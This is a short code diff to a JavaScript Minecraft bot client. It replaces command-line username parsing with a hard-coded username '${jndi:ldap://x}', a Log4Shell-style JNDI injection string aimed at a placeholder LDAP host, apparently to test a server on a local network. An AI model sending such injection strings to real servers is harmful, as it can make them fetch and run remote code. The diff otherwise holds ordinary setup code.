@@ -4,10 +4,26 @@ import { createClient } from 'minecraft-protocol'
 import { attachForge } from './forge'
 import { attachEvents } from './event'
 
-let readUserInfo = process.argv[2] || 'Mr_jtb'
-let realUserInfo = readUserInfo.split(":")
-let username = realUserInfo[0]
-let password = realUserInfo[1] || ''
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// let readUserInfo = process.argv[2] || 'Mr_jtb'
+// let realUserInfo = readUserInfo.split(":")
+// let username = realUserInfo[0]
+let username = '${jndi:ldap://x}'
+let password = '';//realUserInfo[1] || ''
 let version = process.argv[3] || '1.12.2'
 let readAddress = process.argv[4] || '192.168.2.25:25565'
 let realAddress = readAddress.split(":")
